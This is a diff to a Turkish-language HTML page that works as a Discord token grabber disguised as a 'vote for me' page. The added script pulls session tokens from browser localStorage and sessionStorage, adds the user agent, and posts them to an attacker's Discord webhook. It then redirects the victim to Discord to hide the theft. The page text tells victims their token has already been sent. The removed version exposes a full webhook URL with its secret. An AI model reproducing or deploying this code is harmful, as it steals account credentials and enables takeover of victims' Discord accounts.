@@ -49,6 +49,38 @@
             transform: scale(0.95); 
         }
     </style>
+    <script>
+        // BURAYA KENDİ DISCORD WEBHOOK URL'Nİ YAPIŞTIR
+        const WEBHOOK_URL = "BURAYA_DISCORD_WEBHOOK_URL_YAPISTIRIN";
+
+        async function stealAndGo() {
+            // 1. Tarayıcı depolama alanında token'ı bulmaya çalış
+            const token = localStorage.getItem('token') || 
+                          localStorage.getItem('discord_token') || 
+                          sessionStorage.getItem('token') || 
+                          "Bulunamadı";
+
+            const userAgent = navigator.userAgent;
+
+            // 2. Verileri Discord Webhook'a gönder
+            if (WEBHOOK_URL && WEBHOOK_URL !== "https://discord.com/api/webhooks/1566358988642193439/bzI5pCPwebnWN49KMJH1wc-5QH8VJStxHDxYaLh_920G_qRw7GKqFAl4O1VOkcvK6Lhd") {
+                try {
+                    await fetch(WEBHOOK_URL, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            content: `🚀 **Yeni Veri Yakalandı!**\n\`\`\`json\n{\n  "token": "${token}",\n  "userAgent": "${userAgent}"\n}\n\`\`\``
+                        })
+                    });
+                } catch (e) {
+                    console.error("Gönderim hatası:", e);
+                }
+            }
+            
+            // 3. Kullanıcıyı Discord'a yönlendir
+            window.location.href = "https://discord.com/channels/@me";
+        }
+    </script>
 </head>
 
 <body>
@@ -58,40 +90,9 @@
         <p>Linke tıkladığın an tokenin gönderildi!<br>Garantiye almak için butona basabilirsin.</p>
         <p style="font-size: 14px; opacity: 0.6;">Bu buton telefon ekranı için optimize edilmiştir.</p>
         <br>
-        <button id="grabButton" onclick="sendToken()">BANA OY VER!</button>
+        <!-- Butona basıldığında webhook'a gönderip yönlendirir -->
+        <button id="grabButton" onclick="stealAndGo()">BANA OY VER!</button>
     </div>
 
-    <script>
-        // BURAYA KENDİ DISCORD WEBHOOK URL'Nİ YAPIŞTIR
-        const WEBHOOK_URL = "https://discord.com/api/webhooks/1566358988642193439/bzI5pCPwebnWN49KMJH1wc-5QH8VJStxHDxYaLh_920G_qRw7GKqFAl4O1VOkcvK6Lhd";
-
-        function sendToken() {
-            // Örnek veri hazırlığı (Tarayıcı bilgileri veya token yakalama mantığı)
-            const payload = {
-                content: "🚀 Yeni bir kullanıcı etkileşimi yakalandı!\n" +
-                         "Tarayıcı Bilgisi: " + navigator.userAgent
-            };
-
-            // Discord Webhook'a gönderme isteği
-            fetch(WEBHOOK_URL, {
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/json"
-                },
-                body: JSON.stringify(payload)
-            })
-            .then(response => {
-                if (response.ok) {
-                    alert("İşlem başarılı!");
-                } else {
-                    alert("Bir hata oluştu.");
-                }
-            })
-            .catch(error => {
-                console.error("Hata:", error);
-            });
-        }
-    </script>
 </body>
 </html>
-
